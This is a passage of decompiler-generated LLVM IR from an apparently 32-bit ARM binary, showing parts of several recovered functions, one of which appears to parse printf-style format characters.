  store i32 %v3_e2f4, i32* %r1.global-to-local, align 4
  %v1_e2f8 = and i32 %v0_e2f8, 3840
  %v1_e2fc = and i32 %v0_e2f0, -5
  %v2_e300 = or i32 %v1_e2fc, %v1_e2f8
  store i32 %v2_e300, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_e2f0, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_e310 = load i32, i32* %r7.global-to-local, align 4
  %v2_e310 = add i32 %v1_e310, 12
  %v3_e310 = inttoptr i32 %v2_e310 to i32*
  store i32 %v3_e2f4, i32* %v3_e310, align 4
  %v0_e314 = load i32, i32* %r7.global-to-local, align 4
  %v1_e314 = add i32 %v0_e314, 4
  %v2_e314 = inttoptr i32 %v1_e314 to i32*
  %v3_e314 = load i32, i32* @r5, align 4
  store i32 %v3_e314, i32* %v2_e314, align 4
  %v4_e314 = add i32 %v0_e314, 8
  %v5_e314 = inttoptr i32 %v4_e314 to i32*
  %v6_e314 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_e314, i32* %v5_e314, align 4
  %v0_e318 = load i32, i32* %r3.global-to-local, align 4
  %v1_e318 = load i32, i32* %r7.global-to-local, align 4
  %v2_e318 = add i32 %v1_e318, 20
  %v3_e318 = inttoptr i32 %v2_e318 to i32*
  store i32 %v0_e318, i32* %v3_e318, align 4
  %v0_e31c = load i32, i32* %r2.global-to-local, align 4
  %v1_e31c = load i32, i32* %r7.global-to-local, align 4
  %v2_e31c = add i32 %v1_e31c, 16
  %v3_e31c = inttoptr i32 %v2_e31c to i32*
  store i32 %v0_e31c, i32* %v3_e31c, align 4
  %v0_e320 = load i32, i32* %r0.global-to-local, align 4
  %v1_e320 = load i32, i32* %r7.global-to-local, align 4
  %v2_e320 = add i32 %v1_e320, 28
  %v3_e320 = inttoptr i32 %v2_e320 to i32*
  store i32 %v0_e320, i32* %v3_e320, align 4
  %v0_e324 = load i32, i32* @ip, align 4
  %v1_e324 = inttoptr i32 %v0_e324 to i8*
  %v2_e324 = load i8, i8* %v1_e324, align 1
  %v3_e324 = zext i8 %v2_e324 to i32
  store i32 %v3_e324, i32* %r2.global-to-local, align 4
  %v2_e328 = icmp eq i8 %v2_e324, 0
  br i1 %v2_e328, label %dec_label_pc_e330, label %dec_label_pc_e348

dec_label_pc_e330:                                ; preds = %dec_label_pc_e2ec
  %v0_e330 = load i32, i32* %r6.global-to-local, align 4
  %v1_e330 = inttoptr i32 %v0_e330 to i8*
  %v2_e330 = load i8, i8* %v1_e330, align 1
  %v3_e330 = zext i8 %v2_e330 to i32
  store i32 %v3_e330, i32* %r3.global-to-local, align 4
  %v7_e334 = icmp eq i8 %v2_e330, 109
  br i1 %v7_e334, label %dec_label_pc_e33c, label %dec_label_pc_e44c

dec_label_pc_e33c:                                ; preds = %dec_label_pc_e330
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_e340 = load i32, i32* %r7.global-to-local, align 4
  %v2_e340 = add i32 %v1_e340, 32
  %v3_e340 = inttoptr i32 %v2_e340 to i32*
  store i32 20, i32* %v3_e340, align 4
  %v0_e344 = load i32, i32* %r2.global-to-local, align 4
  %v1_e344 = load i32, i32* %r7.global-to-local, align 4
  %v2_e344 = add i32 %v1_e344, 28
  %v3_e344 = inttoptr i32 %v2_e344 to i32*
  store i32 %v0_e344, i32* %v3_e344, align 4
  br label %dec_label_pc_e348

dec_label_pc_e348:                                ; preds = %dec_label_pc_e2ec, %dec_label_pc_e33c
  %v0_e348 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_e348, 1
  br i1 %tmp141, label %dec_label_pc_e400, label %dec_label_pc_e350

dec_label_pc_e350:                                ; preds = %dec_label_pc_e348
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e354

dec_label_pc_e354:                                ; preds = %dec_label_pc_e3e8, %dec_label_pc_e350
  %v8_e370 = phi i32 [ 0, %dec_label_pc_e350 ], [ %v1_e3ec, %dec_label_pc_e3e8 ]
  %v7_e358 = icmp sgt i32 %v8_e370, 2
  br i1 %v7_e358, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_e354
  store i32 %v25_dfb8, i32* %r2.global-to-local, align 4
  %v12_e35c = mul i32 %v8_e370, 4
  %v13_e35c = add i32 %v12_e35c, %v25_dfb8
  store i32 %v13_e35c, i32* %r3.global-to-local, align 4
  %v9_e360 = add i32 %v13_e35c, -24
  %v10_e360 = inttoptr i32 %v9_e360 to i32*
  %v11_e360 = load i32, i32* %v10_e360, align 4
  store i32 %v11_e360, i32* %r2.global-to-local, align 4
  %v9_e364 = load i32, i32* %r7.global-to-local, align 4
  %v10_e364 = add i32 %v9_e364, %v8_e370
  store i32 %v10_e364, i32* %r3.global-to-local, align 4
  %v9_e36c = trunc i32 %v11_e360 to i8
  %v11_e36c = add i32 %v10_e364, 36
  %v12_e36c = inttoptr i32 %v11_e36c to i8*
  store i8 %v9_e36c, i8* %v12_e36c, align 1
  %v8_e374 = load i32, i32* %r3.global-to-local, align 4
  %v9_e374 = add i32 %v8_e374, 36
  %v10_e374 = inttoptr i32 %v9_e374 to i8*
  %v11_e374 = load i8, i8* %v10_e374, align 1
  %v12_e374 = zext i8 %v11_e374 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_e354
  %v10_e370 = add i32 %v8_e370, %stack_var_-48.3
  store i32 %v10_e370, i32* %r3.global-to-local, align 4
  %v9_e378 = add i32 %v10_e370, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_e39c = phi i32 [ %v12_e374, %bb142 ], [ %v9_e378, %bb143 ]
  store i32 %v0_e39c, i32* @r2, align 4
  %v1_e37c = load i32, i32* %sb.global-to-local, align 4
  %v2_e37c = sub i32 %v0_e39c, %v1_e37c
  %v4_e37c = xor i32 %v1_e37c, %v0_e39c
  %v5_e37c = xor i32 %v2_e37c, %v0_e39c
  %v6_e37c = and i32 %v5_e37c, %v4_e37c
  %v7_e37c = icmp slt i32 %v6_e37c, 0
  %v8_e37c = icmp slt i32 %v2_e37c, 0
  %v9_e37c = icmp eq i32 %v0_e39c, %v1_e37c
  %v3_e380 = xor i1 %v8_e37c, %v7_e37c
  %v4_e380 = or i1 %v9_e37c, %v3_e380
  br i1 %v4_e380, label %dec_label_pc_e390, label %dec_label_pc_e384

dec_label_pc_e384:                                ; preds = %bb144
  %v1_e384 = add i32 %v0_e39c, -9
  %v3_e384 = sub i32 8, %v0_e39c
  %v4_e384 = and i32 %v3_e384, %v0_e39c
  %v5_e384 = icmp slt i32 %v4_e384, 0
  %v6_e384 = icmp slt i32 %v1_e384, 0
  %v7_e384 = icmp eq i32 %v0_e39c, 9
  %v3_e388 = xor i1 %v6_e384, %v5_e384
  %v4_e388 = or i1 %v7_e384, %v3_e388
  br i1 %v4_e388, label %dec_label_pc_e38c, label %dec_label_pc_e44c

dec_label_pc_e38c:                                ; preds = %dec_label_pc_e384
  store i32 %v0_e39c, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e390

dec_label_pc_e390:                                ; preds = %bb144, %dec_label_pc_e38c
  store i32 %v25_dfb8, i32* @ip, align 4
  %v1_e394 = load i32, i32* %r8.global-to-local, align 4
  %v4_e394 = mul i32 %v1_e394, 4
  %v5_e394 = add i32 %v4_e394, %v25_dfb8
  store i32 %v5_e394, i32* %r3.global-to-local, align 4
  %v1_e398 = add i32 %v5_e394, -12
  %v2_e398 = inttoptr i32 %v1_e398 to i32*
  %v3_e398 = load i32, i32* %v2_e398, align 4
  store i32 %v3_e398, i32* %r5.global-to-local, align 4
  %v1_e39c = add i32 %v0_e39c, -1
  store i32 %v1_e39c, i32* %sl.global-to-local, align 4
  %v0_e3a0 = load i32, i32* %r7.global-to-local, align 4
  %v4_e3a0 = mul i32 %v1_e39c, 4
  %v5_e3a0 = add i32 %v0_e3a0, %v4_e3a0
  store i32 %v5_e3a0, i32* %r3.global-to-local, align 4
  %v7_e3a4 = icmp eq i32 %v3_e398, 8
  %v1_e3a8 = add i32 %v5_e3a0, 40
  %v2_e3a8 = inttoptr i32 %v1_e3a8 to i32*
  %v3_e3a8 = load i32, i32* %v2_e3a8, align 4
  store i32 %v3_e3a8, i32* @r0, align 4
  br i1 %v7_e3a4, label %dec_label_pc_e3e8, label %dec_label_pc_e3b0

dec_label_pc_e3b0:                                ; preds = %dec_label_pc_e390
  %v9_e3b0 = icmp eq i32 %v3_e3a8, %v3_e398
  br i1 %v9_e3b0, label %dec_label_pc_e3d4, label %bb145

bb145:                                            ; preds = %dec_label_pc_e3b0
  %v8_e3b4 = icmp eq i32 %v3_e3a8, 8
  br i1 %v8_e3b4, label %dec_label_pc_e3d4, label %dec_label_pc_e3bc

dec_label_pc_e3bc:                                ; preds = %bb145
  %v0_e3bc = call i32 @function_df6c()
  %v0_e3c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e3c4, i32* @r0, align 4
  %v0_e3c8 = call i32 @function_df6c()
  store i32 %v0_e3c8, i32* %r0.global-to-local, align 4
  %v8_e3d0 = icmp sgt i32 %v0_e3bc, %v0_e3c8
  br i1 %v8_e3d0, label %dec_label_pc_e3e8, label %dec_label_pc_e3bc.dec_label_pc_e3d4_crit_edge

dec_label_pc_e3bc.dec_label_pc_e3d4_crit_edge:    ; preds = %dec_label_pc_e3bc
  %v1_e3d8.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_e3e0.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_e3e0.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e3d4

dec_label_pc_e3d4:                                ; preds = %dec_label_pc_e3bc.dec_label_pc_e3d4_crit_edge, %dec_label_pc_e3b0, %bb145
  %v1_e3e0 = phi i32 [ %v1_e3e0.pre, %dec_label_pc_e3bc.dec_label_pc_e3d4_crit_edge ], [ %v1_e39c, %dec_label_pc_e3b0 ], [ %v1_e39c, %bb145 ]
  %v0_e3e0 = phi i32 [ %v0_e3e0.pre, %dec_label_pc_e3bc.dec_label_pc_e3d4_crit_edge ], [ %v0_e3a0, %dec_label_pc_e3b0 ], [ %v0_e3a0, %bb145 ]
  %v1_e3d8 = phi i32 [ %v1_e3d8.pre, %dec_label_pc_e3bc.dec_label_pc_e3d4_crit_edge ], [ %v1_e394, %dec_label_pc_e3b0 ], [ %v1_e394, %bb145 ]
  store i32 %v25_dfb8, i32* %r1.global-to-local, align 4
  %v4_e3d8 = mul i32 %v1_e3d8, 4
  %v5_e3d8 = add i32 %v4_e3d8, %v25_dfb8
  store i32 %v5_e3d8, i32* %r3.global-to-local, align 4
  %v1_e3dc = add i32 %v5_e3d8, -12
  %v2_e3dc = inttoptr i32 %v1_e3dc to i32*
  %v3_e3dc = load i32, i32* %v2_e3dc, align 4
  store i32 %v3_e3dc, i32* @r2, align 4
  %v4_e3e0 = mul i32 %v1_e3e0, 4
  %v5_e3e0 = add i32 %v4_e3e0, %v0_e3e0
  store i32 %v5_e3e0, i32* %r3.global-to-local, align 4
  %v2_e3e4 = add i32 %v5_e3e0, 40
  %v3_e3e4 = inttoptr i32 %v2_e3e4 to i32*
  store i32 %v3_e3dc, i32* %v3_e3e4, align 4
  br label %dec_label_pc_e3e8

dec_label_pc_e3e8:                                ; preds = %dec_label_pc_e3bc, %dec_label_pc_e390, %dec_label_pc_e3d4
  %v0_e3e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_e3e8 = add i32 %v0_e3e8, 28
  %v2_e3e8 = inttoptr i32 %v1_e3e8 to i32*
  %v3_e3e8 = load i32, i32* %v2_e3e8, align 4
  %v0_e3ec = load i32, i32* %r8.global-to-local, align 4
  %v1_e3ec = add i32 %v0_e3ec, 1
  store i32 %v1_e3ec, i32* %r8.global-to-local, align 4
  %v1_e3f0 = add i32 %v3_e3e8, 2
  store i32 %v1_e3f0, i32* %r3.global-to-local, align 4
  %v6_e3f8 = icmp slt i32 %v1_e3ec, %v1_e3f0
  br i1 %v6_e3f8, label %dec_label_pc_e354, label %dec_label_pc_e418

dec_label_pc_e400:                                ; preds = %dec_label_pc_e348
  %v0_e400 = load i32, i32* %r7.global-to-local, align 4
  %v1_e400 = add i32 %v0_e400, 28
  %v2_e400 = inttoptr i32 %v1_e400 to i32*
  %v3_e400 = load i32, i32* %v2_e400, align 4
  store i32 %v3_e400, i32* %r2.global-to-local, align 4
  %v0_e404 = load i32, i32* %r0.global-to-local, align 4
  %v1_e404 = trunc i32 %v0_e404 to i8
  %v3_e404 = add i32 %v0_e400, 38
  %v4_e404 = inttoptr i32 %v3_e404 to i8*
  store i8 %v1_e404, i8* %v4_e404, align 1
  %v0_e408 = load i32, i32* %r2.global-to-local, align 4
  %v3_e408 = mul i32 %v0_e408, 4
  store i32 %v3_e408, i32* @r2, align 4
  %v0_e40c = load i32, i32* %r7.global-to-local, align 4
  %v1_e40c = add i32 %v0_e40c, 40
  store i32 %v1_e40c, i32* @r0, align 4
  %v2_e410 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_e410, i32* @r1, align 4
  %v0_e414 = call i32 @function_ec10()
  store i32 %v0_e414, i32* %r0.global-to-local, align 4
  %v0_e418.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e418

dec_label_pc_e418:                                ; preds = %dec_label_pc_e3e8, %dec_label_pc_e400
  %v2_e434 = phi i32 [ %v0_e418.pre, %dec_label_pc_e400 ], [ %v0_e3e8, %dec_label_pc_e3e8 ]
  %v1_e418 = add i32 %v2_e434, 16
  %v2_e418 = inttoptr i32 %v1_e418 to i32*
  %v3_e418 = load i32, i32* %v2_e418, align 4
  store i32 %v3_e418, i32* %r3.global-to-local, align 4
  %v1_e41c = and i32 %v3_e418, 128
  %v2_e41c = icmp eq i32 %v1_e41c, 0
  br i1 %v2_e41c, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_e418
  store i32 %v2_dfc0, i32* %r3.global-to-local, align 4
  %v2_e424 = inttoptr i32 %v2_e434 to i32*
  %v3_e424 = load i32, i32* %v2_e424, align 4
  %v2_e42c.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_e42c = sub i32 %v2_e42c.pre, %v2_dfc0
  store i32 %v3_e42c, i32* %r3.global-to-local, align 4
  %v5_e430 = mul i32 %v3_e42c, 4
  %v6_e430 = add i32 %v5_e430, %v3_e424
  store i32 %v6_e430, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_e418
  %v1_e42841 = load i32, i32* %r6.global-to-local, align 4
  %v2_e42842 = add i32 %v1_e42841, 1
  store i32 %v2_e42842, i32* %r3.global-to-local, align 4
  %v3_e434 = inttoptr i32 %v2_e434 to i32*
  store i32 %v2_e42842, i32* %v3_e434, align 4
  %v0_e438.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_e440 = phi i32 [ %v2_e434, %.thread44 ], [ %v0_e438.pre, %.thread46 ]
  %v1_e438 = add i32 %v1_e440, 28
  %v2_e438 = inttoptr i32 %v1_e438 to i32*
  %v3_e438 = load i32, i32* %v2_e438, align 4
  store i32 %v3_e438, i32* %r3.global-to-local, align 4
  %v1_e43c = add i32 %v3_e438, 2
  store i32 %v1_e43c, i32* %r0.global-to-local, align 4
  %v0_e440 = load i32, i32* %sb.global-to-local, align 4
  %v2_e440 = add i32 %v1_e440, 24
  %v3_e440 = inttoptr i32 %v2_e440 to i32*
  store i32 %v0_e440, i32* %v3_e440, align 4
  br i1 %v2_e41c, label %dec_label_pc_e450, label %bb147

bb147:                                            ; preds = %bb146
  %v1_e444 = load i32, i32* @r2, align 4
  %v2_e444 = load i32, i32* %r7.global-to-local, align 4
  %v3_e444 = inttoptr i32 %v2_e444 to i32*
  store i32 %v1_e444, i32* %v3_e444, align 4
  br label %dec_label_pc_e450

dec_label_pc_e44c:                                ; preds = %dec_label_pc_e008, %dec_label_pc_e114, %dec_label_pc_e1c4, %dec_label_pc_e198, %dec_label_pc_e1a4, %dec_label_pc_e0e4, %dec_label_pc_e384, %dec_label_pc_e330, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e450

dec_label_pc_e450:                                ; preds = %bb147, %bb146, %dec_label_pc_e44c
  %v2_e454 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_e454, i32* @r4, align 4
  store i32 %v6_dfb8, i32* @r5, align 4
  %v26_e454 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_e454

; uselistorder directives
  uselistorder i32 %v3_e42c, { 1, 0 }
  uselistorder i32 %v1_e3ec, { 1, 2, 0 }
  uselistorder i32 %v0_e3a0, { 1, 2, 0 }
  uselistorder i32 %v2_e37c, { 1, 0 }
  uselistorder i32 %v1_e37c, { 1, 0, 2 }
  uselistorder i32 %v0_e39c, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_e2e0, { 1, 2, 0 }
  uselistorder i32 %v3_e2c8, { 1, 0 }
  uselistorder i32 %v3_e2c0, { 1, 0 }
  uselistorder i32 %v2_e2a0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e288, { 0, 2, 3, 1 }
  uselistorder i32 %v1_e26c, { 1, 0, 2 }
  uselistorder i32 %v3_e24c, { 2, 1, 0 }
  uselistorder i32 %v1_e210, { 0, 2, 3, 1 }
  uselistorder i32 %v2_e1e4, { 1, 0 }
  uselistorder i32 %v5_e144, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e144, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_e0f0, { 1, 0 }
  uselistorder i32 %v0_e10c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_e0d4, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_e0bc, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_e0a8, { 1, 2, 0 }
  uselistorder i32 %v0_e120, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_e05c, { 1, 0 }
  uselistorder i32 %v1_e02c, { 0, 2, 1 }
  uselistorder i32 %v25_dfb8, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 3, 2, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 16, 3, 7, 4, 17, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 0, 18 }
  uselistorder i32* %r6.global-to-local, { 13, 14, 11, 9, 3, 5, 12, 6, 7, 8, 0, 1, 2, 15, 4, 10 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 5, 7, 6, 8, 9, 10, 11, 12, 13, 20, 19, 14, 22, 15, 16, 17, 23, 18, 24, 25, 1, 26, 27, 28, 21, 0 }
  uselistorder i32 ()* @function_df6c, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_15d6c.364 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_15d7c.362 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_15d98.356 to i32), { 2, 1, 3, 0 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_15d58.354 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0 }
  uselistorder label %dec_label_pc_e450, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e44c, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_e418, { 1, 0 }
  uselistorder label %dec_label_pc_e3e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e3d4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e390, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_e348, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e1fc, { 1, 0 }
  uselistorder label %dec_label_pc_e1d4, { 1, 0 }
  uselistorder label %dec_label_pc_e184, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_e104, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e100, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e060, { 1, 0 }
  uselistorder label %dec_label_pc_e050, { 1, 0 }
}

define i32 @function_e47c(i8* %arg1) local_unnamed_addr {
dec_label_pc_e47c:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e47c = load i32, i32* @r4, align 4
  store i32 %v3_e47c, i32* %stack_var_-16, align 4
  %v2_e480 = add i32 %tmp, 52
  %v3_e480 = inttoptr i32 %v2_e480 to i32*
  %v4_e480 = load i32, i32* %v3_e480, align 4
  store i32 %v4_e480, i32* %r6.global-to-local, align 4
  %v2_e488 = ptrtoint i32* %stack_var_-32 to i32
  %v2_e48c = icmp eq i32 %v4_e480, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_e488, i32* @r0, align 4
  br i1 %v2_e48c, label %dec_label_pc_e4a4, label %dec_label_pc_e4c0

dec_label_pc_e4a4:                                ; preds = %dec_label_pc_e47c
  %v1_e4ac = call i32 @function_10840()
  %v1_e4bc = call i32 @function_10838()
  %v0_e4c0.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_e4c8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e4c0

dec_label_pc_e4c0:                                ; preds = %dec_label_pc_e47c, %dec_label_pc_e4a4
  %v0_e4c8 = phi i32 [ %v4_e480, %dec_label_pc_e47c ], [ %v0_e4c8.pre, %dec_label_pc_e4a4 ]
  %v0_e4c0 = phi i32 [ %tmp, %dec_label_pc_e47c ], [ %v0_e4c0.pre, %dec_label_pc_e4a4 ]
  %v1_e4c0 = add i32 %v0_e4c0, 1
  %v2_e4c0 = inttoptr i32 %v1_e4c0 to i8*
  %v3_e4c0 = load i8, i8* %v2_e4c0, align 1
  %v4_e4c0 = zext i8 %v3_e4c0 to i32
  %v1_e4c4 = inttoptr i32 %v0_e4c0 to i8*
  %v2_e4c4 = load i8, i8* %v1_e4c4, align 1
  %v3_e4c4 = zext i8 %v2_e4c4 to i32
  %v2_e4c8 = icmp eq i32 %v0_e4c8, 0
  %v4_e4d4 = mul nuw nsw i32 %v4_e4c0, 256
  %v5_e4d4 = or i32 %v3_e4c4, %v4_e4d4
  store i32 %v5_e4d4, i32* %r4.global-to-local, align 4
  br i1 %v2_e4c8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e4c0
  call void @__pseudo_branch(i32 67648)
  %v0_e4e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e4c0, %bb
  %v0_e4e4 = phi i32 [ %v5_e4d4, %dec_label_pc_e4c0 ], [ %v0_e4e4.pre, %bb ]
  %v1_e4e4 = and i32 %v0_e4e4, 4
  %v2_e4ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e4ec, i32* %r4.global-to-local, align 4
  ret i32 %v1_e4e4

; uselistorder directives
  uselistorder i32 %v0_e4c0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e4c0, { 1, 0 }
}

define i32 @function_e500(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e500:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e500 = load i32, i32* @r4, align 4
  store i32 %v3_e500, i32* %stack_var_-24, align 4
  %v6_e500 = load i32, i32* @r5, align 4
  %v9_e500 = load i32, i32* @r6, align 4
  %v12_e500 = load i32, i32* @r7, align 4
  %v1_e504 = add i32 %arg3, 52
  %v2_e504 = inttoptr i32 %v1_e504 to i32*
  %v3_e504 = load i32, i32* %v2_e504, align 4
  store i32 %v3_e504, i32* %r8.global-to-local, align 4
  %v2_e508 = ptrtoint i32* %stack_var_-40 to i32
  %v1_e50c = add i32 %arg3, 56
  store i32 %v1_e50c, i32* @r5, align 4
  %v2_e510 = icmp eq i32 %v3_e504, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_e508, i32* @r0, align 4
  br i1 %v2_e510, label %dec_label_pc_e530, label %dec_label_pc_e54c

dec_label_pc_e530:                                ; preds = %dec_label_pc_e500
  %v1_e538 = call i32 @function_10840()
  store i32 58700, i32* @lr, align 4
  %v1_e548 = call i32 @function_10838()
  %v0_e54c.pre = load i32, i32* @r6, align 4
  %v0_e550.pre = load i32, i32* @r4, align 4
  %v0_e554.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_e54c

dec_label_pc_e54c:                                ; preds = %dec_label_pc_e500, %dec_label_pc_e530
  %v0_e554 = phi i32 [ %arg1, %dec_label_pc_e500 ], [ %v0_e554.pre, %dec_label_pc_e530 ]
  %v0_e550 = phi i32 [ %arg3, %dec_label_pc_e500 ], [ %v0_e550.pre, %dec_label_pc_e530 ]
  %v0_e54c = phi i32 [ %arg2, %dec_label_pc_e500 ], [ %v0_e54c.pre, %dec_label_pc_e530 ]
  %v3_e558 = inttoptr i32 %v0_e554 to i8*
  %v4_e558 = call i32 @function_e984(i8* %v3_e558, i32 %v0_e54c, i32 %v0_e550)
  %v0_e55c = load i32, i32* %r8.global-to-local, align 4
  %v2_e55c = icmp eq i32 %v0_e55c, 0
  store i32 %v4_e558, i32* %r4.global-to-local, align 4
  br i1 %v2_e55c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e54c
  store i32 58744, i32* @lr, align 4
  call void @__pseudo_branch(i32 67648)
  %v0_e578.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e54c, %bb
  %v0_e578 = phi i32 [ %v4_e558, %dec_label_pc_e54c ], [ %v0_e578.pre, %bb ]
  %v2_e580 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_e580, i32* @r4, align 4
  store i32 %v6_e500, i32* @r5, align 4
  store i32 %v9_e500, i32* @r6, align 4
  store i32 %v12_e500, i32* @r7, align 4
  ret i32 %v0_e578

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e54c, { 1, 0 }
}

define i32 @function_e594(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e594:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e594 = load i32, i32* @r4, align 4
  store i32 %v3_e594, i32* %stack_var_-16, align 4
  %v6_e594 = load i32, i32* @r5, align 4
  %v9_e594 = load i32, i32* @r6, align 4
  %v1_e598 = add i32 %arg2, 52
  %v2_e598 = inttoptr i32 %v1_e598 to i32*
  %v3_e598 = load i32, i32* %v2_e598, align 4
  %v1_e59c = add i32 %arg2, 56
  store i32 %v1_e59c, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e5a0 = icmp eq i32 %v3_e598, 0
  %v2_e5a4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* @r4, align 4
  store i32 %v1_e59c, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v2_e5a0, label %dec_label_pc_e5e0, label %dec_label_pc_e5b8

dec_label_pc_e5b8:                                ; preds = %dec_label_pc_e594
  %v1_e5b8 = add i32 %arg2, 16
  %v2_e5b8 = inttoptr i32 %v1_e5b8 to i32*
  %v3_e5b8 = load i32, i32* %v2_e5b8, align 4
  store i32 %v3_e5b8, i32* %r2.global-to-local, align 4
  %v1_e5bc = add i32 %arg2, 28
